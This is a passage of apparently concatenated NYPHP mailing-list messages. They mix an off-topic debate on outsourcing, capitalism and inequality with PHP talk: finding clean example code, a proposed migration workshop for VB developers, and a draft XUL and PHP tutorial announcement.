that whore called "Wall Street"). But what makes it especially evil, is 
that most of management get to line their own pockets with the money 
they have saved rather than invest better in a smaller workforce. There 
are other ways of saving money that do not involve removing loyalty from 
the workplace and building bigger chasms between ployers and employees.

In the context of this discussion, which is about learning PHP by
reviewing and modifying existing code, a good program is one that is
comprised of clean code. Even a simple guestbook that is very well written
would be good.

This is a question I have often asked myself in the last few years. It 
is too costly to continue in this "capitalism without conscience" model 
without there being serious consequences (not just economically, but 
also socially and environmentally). We clearly cannot continue to put 
people last.

I wouldn't be so sure about that. We have seen systematic and steady 
dismantling of regulations designed to protect us from the worst 
excesses of Wall Street and capitalism - some of this stuff stemed back 
to the Depression era (and the barons of the 20s that caused it). Now we 
have this "embedded" in the very government that supposedly is "of the 
people and for the people".

Go see Farenheit 9/11 (you may hate him, but at least Michael Moore does 
his research and names all his sources - just flick through the appendix 
to any of his books).

Hello all,

I know this has evolved into something not directly related to PHP, but 
I would like the opportunity to respond.

I grew up in a city where children would beg on the street, where many 
had not enough to eat. But many of the poor and the lower-middle class 
did dream of a better life, and many of them succeeded. My grandfather 
was not born into a rich family. His family was not poor, but they were 
not rich either. He established himself as an honest businessmen, and 
refused to buy into the speculation and mania that often visited the 
Indian stock markets. His honesty and hard work paid off, and today, it 
should suffice to say that my uncles are carrying on well in his shoes.

In the middle ages, and even until seventy five years ago, there was 
much scorn for Jews. For it was Jews who ruled the world, or so people 
claimed. In Germany, in 1938, the caricature of the Jew as the thieving, 
greedy businessman is what justified the destruction that occurred on 
Kristallnacht ("night of the broken glass").

If one is living in poverty and misery, should not one attempt to rise 
above it? Is it not the common desire that binds all of us humans - 
regardless of faith or ethnicity - the desire to improve our own lot?

If one is surrounded by poverty, then it would seem out of place to 
drive around in a big car, or with fine clothes on. But are you saying 
that just because India is poor it should stay poor? Should the Indian 
government mandate that people who gain wealth be forced to give it all 
up in a redistribution of it so that everyone is equally poor? The 
history of capitalism has shown us that it produces a world that is not 
perfect - but it has also shown that socialism is not the answer either.

It is a moral obligation to help those less fortunate than oneself - but 
that obligation cannot be mandated by the government. The best the 
government can do in such a case is to collective risks, by taxing the 
rich more, and by using the money gained from that tax to provide health 
insurance and job-loss insurance to all.

It is true that child-labor is prevalent in India. But does that mean 
that the cloud of child labor should obstruct a more educated or 
fortunate child from using skills to sell credit cards to Hummer-driving 
Americans in New York?

It is easy to write off India as a country with a few rich people who 
use the rest of the country as slave labor; it is easy to write off the 
desire for gaining profit as a corrupt and morally reprehensible act. 
But in the human desire to survive, the act of offering something of 
value - a service of good - in exchange for money is perhaps one of the 
noblest ways to survive. We should rise beyond the typical condemnation 
of profit-seeking as being only good enough for those who live in a 
society that can afford it. Profit-seeking which is carried out in an 
honest fashion, and which is driven by honest, hard work cannot be a bad 
thing.

In the recent embarrassing (bumbling) interview with Carole Coleman (of 
RTE), Bush had a single good thing to say: "I should not be talking 
about the speck in your eye, when I have a log in mine". Behind the 
veneer of the most perfect economy and society of the world, America has 
its problems. It is both dangerous and self-deluding to assume that 
America is the perfect example for the world to follow. America has one 
of the most unequal economies of the Western world. If you look at some 
statistics ( 
http://www.worldrevolution.org/Projects/Features/Inequality/USInequality.htm 
), the top 1% of American own as much wealth as the bottom 95% Does this 
inequality give American less of a right to improve their lot?

Again - one has to be careful with the stereotype of the Indian 
businessman here. It is easy to assume that the work done in India 
cannot be good as the work done here. There are constraints that make it 
harder for companies providing outsourced services to compete well: 
there is an enormous demand for skilled technology and knowledge workers 
in India, making retaining people very hard. Secondly, the fact that 
they have to rely on the phone, email and IM rather than a quick 
face-to-face chat makes things harder. But presenting a stereotype of 
the typical Indian as being the same as that of the greedy Jew (as 
present in Germany in 1938) hawking sub-standard wares with the singular 
drive toward profit and profit alone is both unsettling and dangerous.

I hope that outsourcing does not bring on the (much anticipated) clash 
of civilizations.

I personally know of people (friends, family members) being hired by 
small businesses who advertised on Craiglist. My point is that the 
current unemployment and economy statistics being bandied about the Bush 
administration do not reflect reality; most of the growth in the current 
and past quarter can be attributed to company profit growth (about 50%, 
I think) rather than workers' wage growth (1%, I think).

While technology outsourcing does not necessarily work for all 
companies, it has been going on in full force for at least eight years 
now. While some companies have not been successful with it, some clearly 
have. It is unfair, I think, to define any kind of outsourced work as 
being of poor quality. It is harder to provide outsourced labor at a 
very level of quality for the reasons that I outlined above, but still I 
am sure there are some companies in America which are happy with the 
outsourced services they have received. If companies continually lost 
money on it, they would stop doing it.

One can talk about the last impact of great cultures, or of how great 
societies should be defined by their great works of art and towering 
museums. But all those great institutions would not be fundable without 
a society grounded on relative equality and prosperity. One has to stop 
viewing the acquisition of material wealth as being inherently evil. It 
is not a sin to be well fed, to have a home that one can call one's own, 
and to have a bit of money saved under the bed for the time when one is 
no longer able to work. What one has to be wary of is societies that on 
the surface appear to be vibrant, but underneath possess foundations 
that are rotting from the slow drip of diversion of public money into 
neo-fascist military expansion at the expense of health care and shared 
risks for all. No society is perfect, but please: let us applaud those 
who want to make a better life for themselves through hard work and honest.

And this brings us to the importance of marketng. Yes, the value is in 
the market's need and use. However, is that the only value for your case 
of the CMS you wrote?

If you promote it as an exmple of an updateable websites system that 
works, and is being used by happy customers, can do these great things, 
then yes -- it is a good app.
If you promote it as a CMS, however, it may have negative value. It may 
be compared to other modern CMS systems, and look pale in the 
comparison, and reflect badly on you as a  provider of services.

Just because you're customers are happy doesn't mean your work is good. 
Unless you define your work as making your customer's happy, of course. 
Since you are a small business owner, I understand your dual perspective 
(it has to be respectable and it has to make the customer happy). As a 
programmer, however, you may not have the same perspective. I consider a 
programmer that understands customer realtions a rare find... and often 
a dangerous asset. I don't want my programmer torn between doing it 
right and doing it in a way that makes the customer happy. I want to 
reserve those decisions for myself, as the business owner, and I want my 
programmer to experience anguish and pain whenever he can't do it "the 
right way" (I find those people are the best programmers :-)

Sounds like we don't disagree on too much to share a beer and an

Ditto for me, and frankly, that's quite sad.  It unfortunately shows the
state of most public PHP development, and something NYPHP has been
struggling to change since the beginning.  While I'm sure (and know, in
fact) there is good code out there, it's generally kept private (and for
good reason; I know places where PHP is used that you'd *never*
believe).  Thus, the bad code becomes common, and because it's so easy
to write, the process snowballs.

It'd be a snap to start up a clew node on this and get people posting
applications they like.  We can then select a couple of editors to give
the code a quick once over and determine if it should stay on the list
or not.  Any takers?

There's been a lot of good discussion on getting people up to speed on
PHP that come from other languages, such as VB.  As evident from the
threads today, there are many different viewpoints, each with it's own
merit and importance.

I think it'd be foolish to let these insights fade away.  As such, I'd
like to see what type of interest there is to bringing the notion of a
free migration workshop to fruition.

However, NYPHP's existing resources are pretty well strained, so we'd
need some new volunteers to get involved and take charge.  Off the top
of my head, I'd say these types of resources would be needed:

-- general project organizer, manager and planner

-- people with backgrounds other than PHP (like VB, ASP, IIS, etc) that
has already gone down the path to learning PHP

-- people wanting to learn PHP from other backgrounds

-- some space (computer lab type of setting) where this can all happen


Please, step forward and get involved... you're insight and help is
always valuable to the community.

Drop a note to operations not junkmail at nyphp.org or to myself if
interested.

I was probably a moderate level VB programmer 4 years ago, and am
willing to help out with documentation, coding, or even assisting with
a work shop.

I leave at the end of the summer.

Subject: [nycphp-talk] Draft of tutorial on creating rich web applications
 with XUL and PHP posted
Message-ID: <40E36E60.4010008@ceruleansky.com>

Hello all,

I just posted the first draft of a tutorial on creating rich web 
applications using PHP, MySQL, XUL, JavaScript and XML-RPC to my weblog.

I have been working on it for some time now, and wanted to post a draft 
of it in order to get some feedback.

It is a three part series with a large introductory section for people 
who are not that familiar with the technologies and background of what 
the article is about.

It is currently in an unfinished state, but I wanted to get it out there 
early to solicit feedback and make corrections.

It comes with code (and a live demo) of a fortune cookie application 
(whose interface is written in XUL). You can fetch a random cookie, list 
all cookies, or add a cookie using this web application.

The main post about it is here:

http://www.moztips.com/index.php?id=261

The live demo is at:
http://www.moztips.com/fortunecookies/

Please let me know what you think (good or bad).

Best Regards,

- Jay Sheth

Whoa..
How is it that I have missed XUL totally?
I am baffled that I have not seen this before...
That is so cool.. 
Now I want to rebuild my coding site in it...

Sometimes the code you write is not yours to share. As a consultant,
contracts often state that the code/application produced is the property
of the company.
That is not to say that concepts can be re-written and shared, but that
is also not always cut-and-dry (and it takes time).

I have done certain things that I think might be useful to some, at
least as a strawman to figure certain things out, but sometimes, as code
may have been written in haste (and it ain't broke, so don't I fix it),
I'd be a little embarrased to have others see and scrutinize what I've
done. So, unfortunately, I keep it to myself... :(
